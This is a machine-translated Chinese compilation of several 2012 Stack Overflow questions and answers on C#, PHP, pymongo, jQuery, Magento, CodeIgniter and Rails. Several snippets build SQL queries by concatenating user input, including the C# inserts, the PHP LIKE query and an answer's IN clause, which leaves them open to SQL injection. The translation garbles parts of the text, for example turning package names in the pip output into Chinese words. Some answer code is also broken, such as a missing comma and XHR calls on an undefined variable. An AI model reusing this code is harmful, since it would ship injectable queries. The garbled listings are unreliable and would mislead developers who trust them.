    cmd.CommandText = "INSERT INTO company VALUES('address','" + CompanyAddress.Text.Trim() + "');";
    cmd.ExecuteNonQuery();

    cmd.CommandText = "INSERT INTO company VALUES('phone','" + CompanyPhone.Text.Trim() + "');";
    cmd.ExecuteNonQuery();

    cmd.CommandText = "INSERT INTO company VALUES('email','" + CompanyEmail.Text.Trim() + "');";
    cmd.ExecuteNonQuery();

    conn.Close();
} 
```

我在**cmd.ExecuteNonQuery()**行遇到异常，如何解决它。

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-05-15T15:21:51.993

你的第一个`cmd.ExecuteNonQuery();`是罪魁祸首。连接开口下方的一个。

我认为它在那里给出错误，因为直到那个时候才设置命令。评论它，它应该没问题。

**编辑**

如果这不起作用，则此问题可能有两个原因。

首先 - 连接到正确的数据库，但那里没有这样的表。

第二 - 连接到错误的数据库。在这种情况下，它不会出错。它在指定位置创建一个数据库文件。甚至 打开数据库。但是在获取/更新数据时会出现此错误。在这种情况下，指定位置将包含一个 0 KB 的数据库。

我对这个[问题](https://stackoverflow.com/questions/9989984/system-data-sqlite-no-such-table-error-occures-when-executing-query/9990115#9990115)的回答会帮助你

**与问题相关的注意/警告，与答案无关：**

始终注意[SQL 注入](http://en.wikipedia.org/wiki/SQL_injection)。使用参数化查询（带有@的查询）。

[更多关于 SQL 注入](http://msdn.microsoft.com/en-us/library/ms161953%28v=SQL.90%29.aspx)

# php - 如何获取相关的mysql php记录？

> ID：10603749
> 
> 赞同：-2
> 
> 时间：2012-05-15T15:13:52.260
> 
> 标签：php, mysql, datagrid

我有 mysql 表“文件”。其中包含以下命令。1\. id 2.filename 3.keywords

显示一个文件时，我想按最匹配的关键字显示来自同一数据库表顺序的相关文件。

应该是这样的

```
 $keywords = $db->getkeywords('5');

 //getting related files

 $sql = "select * from 'file's where 'keywords' like '$keywords'"; 
```

？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:23:40.787

使用这样的东西：

```
$keywords = join(',' $db->getkeywords('5')); 
$sql = "SELECT * FROM files WHERE keywords IN ($keywords)"; 
```

# python - 无法使用 pymongo 2.2 连接到 MongoDB 2.0.5 数据库

> ID：10603754
> 
> 赞同：9
> 
> 时间：2012-05-15T15:14:03.787
> 
> 标签：python, mongodb, pymongo, bson

我已经坚持诊断这个几个小时了，我想看看是否有任何 pymongo 专家有任何想法：

**以下代码行：**

连接 = pymongo.Connection('localhost', 27017)

**生成以下错误：**

/usr/local/Cellar/python/2.7.3/bin/python2.7 /Users/danwilson/Dropbox/Projects/mysite/app.py
Traceback（最近一次通话最后）：
文件“/Users/danwilson/Dropbox/Projects /mysite/app.py”，第 149 行，在
main()
文件“/Users/danwilson/Dropbox/Projects/mysite/app.py”，第 144 行，在 main
http_server = tornado.httpserver.HTTPServer(Application())
文件“/Users/danwilson/Dropbox/Projects/mysite/app.py”，第 54 行，在**init**
self.connection = pymongo.Connection('localhost', 27017)
文件“/usr/local/Cellar/python/2.7\. 3/lib/python2.7/site-packages/pymongo/connection.py”，第 290 行，在**init**
self.__find_node()
文件“/usr/local/Cellar/python/2.7.3/lib/python2.7/site-packages/pymongo/connection.py”，第 586 行，在 __find_node
raise AutoReconnect(', '.join(errors))
pymongo .errors.AutoReconnect：“模块”对象没有属性“decode_all”

**mongod 的流输出确认连接：**

My-MacBook-Pro:~ username$ mongod
mongod --help 获取帮助和启动选项
Tue May 15 07:53:50 [initandlisten] MongoDB 开始：pid=2277 port=27017 dbpath=/data/db/ 64-bit host =My-MacBook-Pro.local
5 月 15 日星期二 07:53:50 [initandlisten] db 版本 v2.0.5，pdfile 版本 4.5
5 月 15 日星期二 07:53:50 [initandlisten] git 版本：1bb4de4630302fad8af53824ca4f627db490b753
5 月 15 日星期二 07:53： 50 [initandlisten] 构建信息：达尔文 erh2.10gen.cc 9.8.0 达尔文内核
版本 9.8.0：2009 年 7 月 15 日星期三 16:55:01 PDT；root:xnu-1228.15.4~1/RELEASE_I386 i386 BOOST_LIB_VERSION=1_40
Tue May 15 07:53:50 [initandlisten] options: {}
Tue May 15 07:53:50 [initandlisten] journal dir=/data/db/journal
5 月 15 日星期二 07:53:50 [initandlisten] 恢复：不存在日志文件，不需要恢复
5 月 15 日星期二 07:53:50 [websvr] 管理 Web 控制台等待端口 28017 上的连接
5 月 15 日星期二 07:53:50 [ initandlisten] 等待端口 27017 上的连接
5 月 15 日星期二 07:53:57 [initandlisten] 连接从 127.0.0.1:50263 #1
5 月 15 日星期二 07:53:57 [conn1] 结束连接 127.0.0.1:50263

**包版本**

my-MacBook-Pro:~ username$ pip freeze
PyYAML==3.10
bson==0.3.3
分发==0.6.26
mimeparse==0.1.3
pymongo==2.2
python-dateutil==2.1
pytz==2012c
六== 1.1.0
龙卷风==2.2.1
virtualenv==1.7.1.2
wsgiref==0.1.2

**MongoDB版本**

My-MacBook-Pro:~ username$ brew info mongodb
mongodb 2.0.5-x86_64
[http://www.mongodb.org/](http://www.mongodb.org/)
/usr/local/Cellar/mongodb/2.0.5-x86_64（17个文件，121M）*
[https ://github.com/mxcl/homebrew/commits/master/Library/Formula/mongodb.rb](https://github.com/mxcl/homebrew/commits/master/Library/Formula/mongodb.rb)

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-19T16:52:59.050

这个问题的解决方案对 pip 来说不是好消息：我不得不卸载 pymongo 和 bson，然后重新安装 bson，然后再安装 pymongo。所以看起来安装顺序实际上很重要！

# jquery - JQuery Ajax 调用的正确形式

> ID：10603755
> 
> 赞同：0
> 
> 时间：2012-05-15T15:14:10.917
> 
> 标签：jquery, ajax

链接 Ajax 调用是一种好习惯吗？我知道 ajax 调用是异步的，但我有一种情况，我想根据第一次调用的成功或错误触发另一个 ajax 调用。代码看起来像这样......

```
$.ajax({
    url:'urlToFile.html', 
    success:function(result){
       $.ajax({
          url:'secondAjaxCall.html', 
          success:function(result){
             alert("past");
          },
          error: function(result) {
             alert("no connection");
          }
       });
    },
    error: function(result) {
       alert("no connection");
    }
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:16:55.237

这没什么不好。如果你有很多这样的事情，那么可能值得研究一个控制流库，只是为了让你的代码免受嵌套异步回调引起的“金字塔效应” - 但是两层左右仍然很容易推理。

# symfony-1.4 - 减小使用 PHPExcel 生成的 PDF 文件的大小

> ID：10603760
> 
> 赞同：1
> 
> 时间：2012-05-15T15:14:23.243
> 
> 标签：symfony-1.4, phpexcel

我目前正在开发一个基于 Symfony 1.4 的项目。为了生成 PDF 文件，我使用了很棒的 PHPExcel 库（通过 sfPhpExcelPlugin）。它工作正常，但我面临一个问题：生成的 PDF 文件，即使是空的，大小也超过 500kb。

它从何而来 ？我可以做些什么来减少文件大小吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T17:04:33.313

允许您从 tcPDF、DomPDF 或 mPDF 中选择作为 PDF 渲染库的开关将为当前的 tcPDF 提供替代方案，后者确实会生成过大的文件。mPdf 和 DomPDF 都比 tcPDF 速度更快，内存效率更高，并且产生的输出文件更小，但各有其固有的问题；直到今年晚些时候的 1.7.8 版本才计划完成这项工作。

# c# - PhotoChooserTask 的使用

> ID：10603764
> 
> 赞同：2
> 
> 时间：2012-05-15T15:14:26.487
> 
> 标签：c#, windows-phone-7

我的 Windows Phone 应用程序中有一个图像列表（作为内容）。如何使用 PhotoChooserTask 查看它们？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:39:00.643

这是通过单击按钮触发任务的基本粗略示例。

下面的代码使用按钮单击事件来触发 PhotoChooserTask()，然后将所选图像放入图像控件中。

您将需要使用参考任务

```
using Microsoft.Phone.Tasks; 
```

然后使用如下代码

```
public MainPage()
    {
    InitializeComponent();
        photoChooserTask = new PhotoChooserTask();
        photoChooserTask.Completed += new EventHandler<PhotoResult>(photoChooserTask_Completed);
        }
        private void photochooserbtn_Click(object sender, RoutedEventArgs e)
         {
         photoChooserTask.Show();
         }
        void photoChooserTask_Completed(object sender, PhotoResult e)
         {
         if (e.TaskResult == TaskResult.OK)
         {
         System.Windows.Media.Imaging.BitmapImage bmp =new     System.Windows.Media.Imaging.BitmapImage();
         bmp.SetSource(e.ChosenPhoto);
         imagecontrol.Source = bmp;
         }
       } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:55:19.633

如果您已经有应用程序预加载的图像，那么您可以像这样显示它们：

```
<ListBox ItemsSource="{Binding Images}">
    <ListBox.ItemTemplate>
        <DataTemplate>
            <Image Source="{Binding}" Width="200"/>
        </DataTemplate>
    </ListBox.ItemTemplate>
</ListBox> 
```

这假设您的页面的数据上下文有一个名为“图像”的属性

```
public IEnumerable<Uri> Images { get; set; } 
```

并且您正在像这样填充该属性：

```
Images = new List<Uri>
    {
        new Uri("Images/image1.png", UriKind.Relative),
        new Uri("Images/image2.png", UriKind.Relative),
        new Uri("Images/image3.png", UriKind.Relative),
        new Uri("Images/image4.png", UriKind.Relative)
    }; 
```

这假设您已将图像放在项目中的“图像”文件夹下，并且构建操作设置为内容

上述解决方案将为您提供图像的垂直列表。如果您想让它变得更好，请使用 WP7 Toolkit 并将其更改`ItemsPanel`为`ListBox``WrapPanel`

```
 <ListBox.ItemsPanel>
       <ItemsPanelTemplate>
           <toolkit:WrapPanel/>
       </ItemsPanelTemplate>
   </ListBox.ItemsPanel> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:20:29.350

您不能使用 PhotoChooserTask 直接查看您添加到项目中的图片（作为内容）...要使其正常工作，您必须在启动之前将图片保存到图片库（使用[MediaLibrary](http://msdn.microsoft.com/en-us/library/microsoft.xna.framework.media.medialibrary.aspx)类） PhotoChooserTask！

# ajax - 为什么在 Ajax 中访问控制器方法时出现 404 错误？

> ID：10603766
> 
> 赞同：4
> 
> 时间：2012-05-15T15:14:31.260
> 
> 标签：ajax, asp.net-mvc, jquery, asp.net-mvc-controller

我有一个控制器`ValidationController`，它有一个名为`EmailExist`

我有一个ajax调用

```
$.ajax({    
  type: "POST",    
  url: "/Validation/EmailExist",    
  data: { 'Email': $('#Email').val() },    
  success: function (result) {    
    if (result == true) {    
      alert("true");  
    } else {   
      alert("false");  
    }    
  },  
  error: function (error) {  
    alert(error.responseText);  
  } 
```

我收到 404 错误，但我不知道为什么？关于如何调试它的任何建议或建议？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:16:01.400

您已经硬编码了一个网址：

```
url: "/Validation/EmailExist" 
```

那**很糟糕**。在处理 url 时，您应该始终使用 url 助手：

```
url: "@Url.Action("EmailExist", "Validation")" 
```

这不好的原因是因为您已经对 url 进行了硬编码，您不再依赖于您的路由配置。如果您在 Global.asax 中更改您的路线，您的代码将会中断。当您在 IIS 中部署应用程序时，您的代码也会中断，因为现在您应该考虑一个虚拟目录名称。所以正确的 url 不再是`/Validation/EmailExist`but `/MyAppName/Validation/EmailExist`。助手会考虑所有这些事情，这就是为什么您应该始终使用它们的原因。

当然，如果这是在您无法访问服务器端代码的单独 javascript 文件中，您可以在 DOM 中使用 HTML5 data-* 属性来放置正确的 url 或直接使用一些现有元素，例如表单操作或锚href。

# iphone - iOS webview shouldStartLoadWithRequest 未使用 javascript 触发

> ID：10603768
> 
> 赞同：0
> 
> 时间：2012-05-15T15:14:34.213
> 
> 标签：iphone, objective-c, ios, xcode, cocoa-touch

我正在将 html 文件加载到 webview，然后 javascript 代码触发 shouldStartLoadWithRequest 事件以传递变量。在 iOS 5.X 上一切正常，但在 4.X 事件未触发。是否应该在 iOS 4 上激活任何 uiwebview 属性以启用 javascript 调用？谢谢你。

# sql-server - 将 SQL Server Express 升级到 Developer 性能计数器注册表一致性错误

> ID：10603769
> 
> 赞同：1
> 
> 时间：2012-05-15T15:14:37.297
> 
> 标签：sql-server, sql-server-2008, reporting-services, ssrs-2008, performancecounter

![在此处输入图像描述](../Images/65d1b54a6fa97b6dcafc1b990555d721.png)

我目前正在尝试将我的 SQL Server Express Edition 版本升级到 Developer Edition。

我遇到了这个失败消息，有人可以吗

A.）解释是一种基本的清晰方式，这实际上意味着什么，所以我可以理解它。

和

B.) 为这个问题提出解决方案

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:23:53.080

[除了尝试通过错误消息中提到的知识库文章](http://support.microsoft.com/kb/300956)修复计数器之外，我建议您安装适当的 Developer Edition 实例，而不是尝试就地升级。然后从 Express 备份您的用户数据库，在 Developer 上恢复它们​​，一旦您对一切正常工作感到满意，请卸载 Express Edition。除了在迁移到新版本*和*新版本时避免特殊的升级问题（除非您不是真的表示 Express 是 SQL Server 2008），您还有一个额外的好处是您的原始数据库仍然完好无损（您赢得了'如果升级失败比简单地被阻止更糟糕）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:51:39.343

这意味着您的密钥：

> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib\Last Counter

和

> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib\009

彼此不同。

![在此处输入图像描述](../Images/1eac7750f5e32d1fbf441ff4b6fe32f1.png)

检查您是否有禁用性能计数器键并将其设置为 0（我删除了我的，如您在打印屏幕上看到的那样）

然后通过运行重建性能计数器：

```
cd %systemroot%\system32
lodctr /R 
```

您可以通过尝试添加 SQl 服务器计数器来检查它是否在性能监视器上工作

# objective-c - 平滑线视图更改颜色

> ID：10603773
> 
> 赞同：1
> 
> 时间：2012-05-15T15:14:51.793
> 
> 标签：objective-c, ios, cgcontext

我正在使用 levin nunnik 的平滑线视图应用程序，但 Ginamin 的重写版本。

我有一个视图控制器，里面有一个视图。下来我有一些按钮。我正在尝试通过按下按钮来更改笔触颜色。例如按下名为红色的按钮，笔触颜色变为红色等等..

stroke 设置 strokeColor 的函数是这样的：

```
CGContextSetStrokeColorWithColor(context, self.lineColor.CGColor); 
```

我试图`lineColor`在按下按钮时更改属性，但没有任何反应。一些帮助？:(

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T04:04:32.190

我重写了原始程序，加上了撤销/重做/清除/（改变颜色）等功能。程序不是很完整，如果有感兴趣的人一起交流一下。感谢

源代码链接：[https ://github.com/yusenhan/Smooth-Line-View](https://github.com/yusenhan/Smooth-Line-View)

# css - Magento - 使用自定义变量允许最终用户从管理面板修改样式 - 缓存？

> ID：10603776
> 
> 赞同：2
> 
> 时间：2012-05-15T15:14:56.923
> 
> 标签：css, magento, admin

我计划使用 Magento 的内置`Custom Variable`系统来允许用户更改样式的各个方面。很容易将其引入标题并使用以下语句使用样式选项：

```
Mage::getModel('core/variable')->loadByCode('backgroundColour')->getData('store_plain_value'); 
```

在自定义块中，并在块中包含 this `head`：

```
<block type="page/template_links" name="customvars" as="customVars" template="page/html/customvars.phtml"/> 
```

但是，我担心性能。自定义变量是否被缓存？如果我有，比如说，40 个这样的变量，这会不会消耗资源？

我知道我可以将它们全部包含在一个 CSS 块中，但我想保持额外的易用性收益，以免将它们分开。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T18:01:56.123

来自“自定义变量”功能的值

```
System -> Custom Variables 
```

据我所知，**不是专门缓存的。**如果它可以帮助您解决客户的问题，我不会让这阻止您使用它们。其他事情会很快导致性能问题。

如果您查看 Magento 使用这些变量的主要位置

```
#File: app/code/core/Mage/Core/Model/Email/Template/Filter.php
public function customvarDirective($construction)
{
    $customVarValue = '';
    $params = $this->_getIncludeParameters($construction[2]);
    if (isset($params['code'])) {
        $variable = Mage::getModel('core/variable')
            ->setStoreId($this->getStoreId())
            ->loadByCode($params['code']);
        $mode = $this->getPlainTemplateMode()?Mage_Core_Model_Variable::TYPE_TEXT:Mage_Core_Model_Variable::TYPE_HTML;
        if ($value = $variable->getValue($mode)) {
            $customVarValue = $value;
        }
    }
    return $customVarValue;
} 
```

您可以看到它们加载了以下链式方法调用

```
$variable = Mage::getModel('core/variable')
    ->setStoreId($this->getStoreId())
    ->loadByCode($params['code']); 
```

所以你知道在这个代码级别没有缓存。如果跳转到`core/variable`模型类文件

```
#File: app/code/core/Mage/Core/Model/Variable.php
public function loadByCode($code)
{
    $this->getResource()->loadByCode($this, $code);
    return $this;
} 
```

你可以看到theres没有缓存逻辑`loadByCode`方法中没有缓存逻辑。对整个文件的快速 grep 也没有提到字符串“缓存”。

然后，如果您查看模型资源

```
#File: app/code/core/Mage/Core/Model/Resource/Variable.php
public function loadByCode(Mage_Core_Model_Variable $object, $code)
{
    if ($result = $this->getVariableByCode($code, true, $object->getStoreId())) {
        $object->setData($result);
    }
    return $this;
} 
```

再次没有特殊的缓存逻辑。此外，通过此文件对字符串“cache”进行 grep 分析，什么也没有显示。

最后，在否则为空的控制器操作中运行以下代码将转储变量值。

```
public function indexAction()
{   
    $values = Mage::getModel('core/variable')
    ->setStoreId(1)
    ->loadByCode('abc');
    var_dump($values->getData());
    exit;
} 
```

如果您这样做，然后使用单独的工具更新`core_variable_value`表格并重新加载页面，您将看到值已更新。

所有这些都指向未缓存的值。

# jquery - 使用 html5 和 jQuery 预加载音频 + gif

> ID：10603777
> 
> 赞同：1
> 
> 时间：2012-05-15T15:15:03.270
> 
> 标签：jquery, html

我正在开发一个启动页面，该页面会自动启动与 gif 相关的 wav 文件。我想做的是显示一个加载轮，直到 wav 文件和 gif 都完全加载，以便它们同步播放。我宁愿使用 swf，但客户端没有原始项目文件，所以我被困在使用加载非常缓慢的蹩脚 gif 文件中，并且 wav 文件只有在页面完全加载后才会开始播放。我需要他们两个同时玩。有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T16:03:28.697

一种方法是使用`XMLHttpRequest`并`data uri`加载 gif 和音频文件。跟踪`onreadystatechange`两者的事件。当两者都完成时，您可以`httpRequest.responseText`直接设置到它们的`src`属性中。例如下面的代码可以在 html 加载完成后执行..

```
var imageData = "";
var audioData = "";

function onHtmlLoad()
{
    // Show loading wheel..        

    var isImageLoaded = false;
    var isAudioLoaded = false;    

    var imageRequest = new XMLHttpRequest();  
    request.open('GET', 'http://www.website.com/path/to/image.gif', true);

    imageRequest.onreadystatechange = function(e) {  

        if(imageRequest.readyState == 4)
        {
            if(imageRequest.status == 200)
            {
                isImageLoaded = true;
                imageData = imageRequest.responseText; // data uri..
                if(isAudioLoaded)
                    loadSplashScreen();
            }
        }
    }

    imageRequest.send();

    var audioRequest = new XMLHttpRequest();  
    request.open('GET', 'http://www.website.com/path/to/audio.wav', true);

    audioRequest.onreadystatechange = function(e) {  

        if(audioRequest.readyState == 4)
        {
            if(audioRequest.status == 200)
            {
                isAudioLoaded = true;
                audioData = audioRequest.responseText; // data uri..
                if(isImageLoaded )
                    loadSplashScreen();
            }
        }
    }

    audioRequest.send();
}

function loadSplashScreen()
{
    var imgEl = document.getElementById("myImgElement");
    var audioEl = document.getElementById("myAudioElement");

    // loads immediately..
    imgEl.src = imageData;
    audioEl.src = audioData;

    // Hide loading wheel..
} 
```

但也请注意，`data uri`您将在`src`属性中设置的大小可能会受到限制，[请检查此](https://stackoverflow.com/questions/2270151/is-it-possible-to-use-data-uris-in-video-and-audio-tags)。希望这可以帮助..

# java - 使用 Android 上的 OpenGL ES 2.0，在帧缓冲区上渲染时是否可以保留多重采样？

> ID：10603779
> 
> 赞同：1
> 
> 时间：2012-05-15T15:15:11.943
> 
> 标签：java, android, opengl-es-2.0, fbo, multisampling

我正在使用 OpenGL es 2.0 和 java 在 Android ICS 上开发 2d 游戏。我正在尝试使用照明系统，为此我在一个帧缓冲区上渲染所有灯光，在另一个上渲染场景，目的是使用片段着色器将它们混合以重新创建 Photoshop 叠加效果。

不过我遇到了一个问题，似乎 fbo 不适用于多重采样，所以如果我在 fbo 上绘图，我会得到锯齿状的线条。我注意到有一个针对使用 ios 的人的解决方案，但我在 Android 上没有找到任何东西。有没有比我解决这个问题的方式更好的方法来实现我想要做的事情？原谅，我对opengl有点陌生。

非常感谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T19:02:03.373

多重采样（您在创建 OpenGL 上下文时设置）仅适用于默认帧缓冲区。

要在 FBO 上进行多重采样，您必须使用以下扩展之一：

*   [GL_IMG_multisampled_render_to_texture](http://www.khronos.org/registry/gles/extensions/IMG/IMG_multisampled_render_to_texture.txt)
*   [GL_APPLE_APPLE_framebuffer_multisample](http://www.khronos.org/registry/gles/extensions/APPLE/APPLE_framebuffer_multisample.txt)
*   [GL_EXT_multisampled_render_to_texture](http://www.khronos.org/registry/gles/extensions/EXT/EXT_multisampled_render_to_texture.txt)

或者，您可以使用[FXAA](http://timothylottes.blogspot.com/2011/08/fxaa-311-bug-fixes-for-360.html)之类的东西来实现全屏抗锯齿。即使对于移动设备，它的“PC 控制台”版本也非常快。

# php - 在 codeigniter 中使用搜索进行分页

> ID：10603780
> 
> 赞同：0
> 
> 时间：2012-05-15T15:15:20.260
> 
> 标签：php, codeigniter, pagination

我正在制作包含项目中所有日志的日志表，使用 CI 的分页我创建了分页数据。现在的问题是我还必须根据不同的日志类型和分页来过滤日志，我已经尝试了很多但仍然无法弄清楚如何生成分页链接以进行搜索。我正在粘贴控制器代码谢谢。

```
{

    if($this->input->post('show'))
        $logtype_filter = $this->input->post('log_type');
    else
        $logtype_filter ='';

    // load pagination class
    $this->load->library('pagination');
    $config['base_url'] = base_url().'admin/logs/';
    $config['total_rows'] = $this->db->count_all('netsynclogtable');
    $config['per_page'] = '20';
    $config['first_link'] = FALSE;
    $config['last_link'] = FALSE;
    $config['prev_link'] = 'Previous';
    $config['next_link'] = 'Next';
    $config['next_tag_open'] = '<li class="next">';
    $config['next_tag_close'] = '</li>';
    $config['prev_tag_open'] = '<li class="previous">';
    $config['prev_tag_close'] = '</li>';
    $config['num_tag_open'] = '<li>';
    $config['num_tag_close'] = '</li>';
    $config['cur_tag_open'] = '<li class="active">';
    $config['cur_tag_close'] = '</li>';

    $this->pagination->initialize($config);

    //load the model and get results
    $this->load->model('Logger_model');
    $data['logs'] = $this->Logger_model->get_logs($config['per_page'],$this->uri->segment(3),$logtype_filter);
    $data['logtypes'] = $this->Logger_model->get_log_types();
    $data['_view'] = 'admin/logs';
    // load the view

    $this->load->view('layouts/admin',$data);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:24:34.360

我建议你看看[Datatables](http://www.datatables.net/)。它支持几乎所有您需要对表格执行的操作。还有一个[Codeigniter 库](http://codeigniter.com/forums/viewthread/160896/)，但我还没有测试过

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-06T13:56:06.177

尝试在 base_url 中添加您的日志类型，如下所示：

```
 $config['base_url'] =
  base_url().'admin/logs?log_type='.$this->input->get('log_type', TRUE)'; 
```

我在这里使用了 GET 请求，因为单击寻呼机 HTTP 方法中的 NEXT 链接称为 GET 而不是 POST。因为 post 仅在您提交 serach 表单时才有效。因此，一旦提交搜索表单并显示分页结果，现在单击分页链接 GET 请求会生成，因为未提交 serach 表单。

希望这可以帮助。

# api - Mobli API 有哪些可用的客户端库？

> ID：10603782
> 
> 赞同：1
> 
> 时间：2012-05-15T15:15:26.220
> 
> 标签：api, mobli

似乎 Mobli 现在有一个 API（测试版）.. 是否有任何已知的库？

[http://techcrunch.com/2012/04/23/nyc-disrupt-hackathon-details/](http://techcrunch.com/2012/04/23/nyc-disrupt-hackathon-details/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T17:30:40.410

我们将在接下来的几天内正式推出我们的 API，以及适用于 iOS、Android 和 php 的 SDK。

感谢您的关注！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T17:30:20.673

几天后将发布这些库： - iOS - Android - PHP

# django - 在 django-facebook 上检索用户名并邀请朋友

> ID：10603785
> 
> 赞同：1
> 
> 时间：2012-05-15T15:15:41.867
> 
> 标签：django, facebook, django-facebook

我按照说明将 Django-facebook 安装到我的网站中，以允许用户在我的网站上注册、登录、邀请朋友和分享内容。我可以使用他们的 Facebook 帐户轻松地将用户注册到我的网站。但是，我对如何将它们注销、检索用户的 facebook 用户名以及如何集成多选好友邀请的事情感到非常困惑。

这是我的 settings.py 文件

```
TEMPLATE_CONTEXT_PROCESSORS = (
'django_facebook.context_processors.facebook',
'django.contrib.auth.context_processors.auth',
'django.core.context_processors.debug',
'django.core.context_processors.i18n',
'django.core.context_processors.media',
'django.core.context_processors.static',
'django.core.context_processors.tz',
'django.contrib.messages.context_processors.messages',
 )

 AUTHENTICATION_BACKENDS = (
'django_facebook.auth_backends.FacebookBackend',
'django.contrib.auth.backends.ModelBackend',
 )

 AUTH_PROFILE_MODULE = "appname.UserProfile"

FACEBOOK_APP_ID = "<myappID>"
FACEBOOK_APP_SECRET ="<myappsecretkey>" 
```

在我的 models.py 中，我创建了一个自定义用户配置文件，如下所示：

```
# User model
class UserProfile(FacebookProfileModel):
user = models.OneToOneField(User)
last_login = models.DateTimeField(blank=True, null=True)
is_active = models.BooleanField(default=False)
playedHours = models.FloatField(default = 0)

playedSongs = models.ManyToManyField(Song, blank=True, null = True)
invitedFriends = models.ManyToManyField('self', blank = True, null = True)

def __unicode__(self):
    return self.facebook_name

 from django.db.models.signals import post_save
 from django.dispatch import receiver

 @receiver(post_save, sender=User)
 def create_profile(sender, instance, created, **kwargs):
  """Create a matching profile whenever a user object is created."""
  if created: 
    profile, new = UserProfile.objects.get_or_create(user=instance) 
```

在 urls.py 我添加了这两行，但我不知道他们做了什么：

```
(r'^facebook/', include('django_facebook.urls')),
(r'^accounts/', include('django_facebook.auth_urls')), 
```

我真正想要实现的是，一旦用户注册了 facebook，我想获取他们的姓名和头像，并允许他们邀请他们的朋友。

我一直在寻找（最新的）教程，但我失败了。非常感谢任何帮助！谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-03T11:46:00.683

为了将它们注销， auth_logout "/logout/" url 可能会有所帮助。

关于 Facebook_name，请查看 FacebookProfileModel：facebook_name = models.CharField(max_length=255, blank=True)

因此，您可以通过 profile_object.facebook_name 访问它。

# ruby-on-rails - 使用 Faker 在 MySQL Rails 数据库中创建示例数据

> ID：10603786
> 
> 赞同：1
> 
> 时间：2012-05-15T15:15:50.727
> 
> 标签：ruby-on-rails, sample-data, faker

我已经在我的数据库中加载了一段时间的“假”数据。现在，我已经做出了足够的更改来重新刷新数据。我已经填充了 3 个表... **Users**、**Stores**和**Gears**。我的问题是填充 Gears 表。我有2个问题。首先也是最重要的......它在某个列（user_id）之后停止填充数据库。您是否必须显式跳过数据库中的列才能使任务的其余部分正常工作，或者我还有什么？请参阅下面的代码...

**sample_data.rake**

```
namespace :db do
  desc "Fill database with sample data"
  task populate: :environment do 
    require 'faker'
    make_gear    
  end

  # def make_users
  #    100.times do |n|
  #          firstname  = Faker::Name.first_name
  #          lastname  = Faker::Name.last_name
  #          email = Faker::Name.first_name + "#{n+1}@equiptme.com"
  #          password  = "password"
  #          User.create!(first_name: firstname,
  #                       last_name: lastname,
  #                       email: email,
  #                       password: password,
  #                       password_confirmation: password,
  #                       admin: "0",
  #                       owner: "0",
  #                       rentor: "1")
  #    end
  #  end  

  # def make_stores
  #   users = User.all
  #   users.each { |user| user.create_store(storename: 'Da Hut') }
  # end 

  def make_gear
    users = User.all
    50.times do |h|
      users.each { |user| user.gears.create(:title => Faker::Company.catch_phrase, 
        :size => "Large", 
        :price => rand(5*100), 
        :sub_category_id => rand(1*61), 
        :year => rand(1982..2012),
        :latefee => rand(1*200),
        :cancellation => Faker::Lorem.paragraph(sentence_count = 3),
        :minrental => Faker::Lorem.paragraph(sentence_count = 1),
        :policy => Faker::Lorem.paragraph(sentence_count = 2),
        :about => Faker::Lorem.paragraph(sentence_count = 2),
        :address => Faker::Address.street_address(include_secondary = false),
        :city => Faker::Address.city,
        :state => Faker::Address.state_abbr,
        :zip => Faker::Address.zip_code) }
    end
  end
end 
```

其次，我在填充数据库时随机出现此错误......我无法弄清楚：

```
bundle exec rake db:populate
rake aborted!
undefined method `name' for nil:NilClass 
```

**齿轮型号**

```
 class Gear < ActiveRecord::Base
      attr_accessible :title, :size, :price, :sub_category_id, :user_id, :image, :image_a, :remote_image_url
      belongs_to :user
      belongs_to :sub_category
      has_one :category, :through => :sub_category
      has_many :comments, :dependent => :destroy 
      require 'carrierwave/orm/activerecord'
      mount_uploader :image, GearpicUploader
      mount_uploader :image_a, GearpicUploader

      validates :title, presence: true
      validates :size,  presence: true
      validates :price, presence: true
      validates :sub_category_id, presence: true
      validates :user_id, presence: true

      searchable do
        text :title, :size, :price 

        text :user_name do
              user.name
        end

        string :sub_category_name do
          sub_category.name
        end

        string :category_name do
          category.name
        end
      end
end 
```

**数据库（齿轮表）**

```
 `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `size` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  `price` int(11) DEFAULT NULL,
  `sub_category_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `image` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `category_id` int(11) DEFAULT NULL,
  `remote_image_url` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `image_a` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `color` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `year` int(11) DEFAULT NULL,
  `latefee` int(11) DEFAULT NULL,
  `cancellation` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `minrental` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
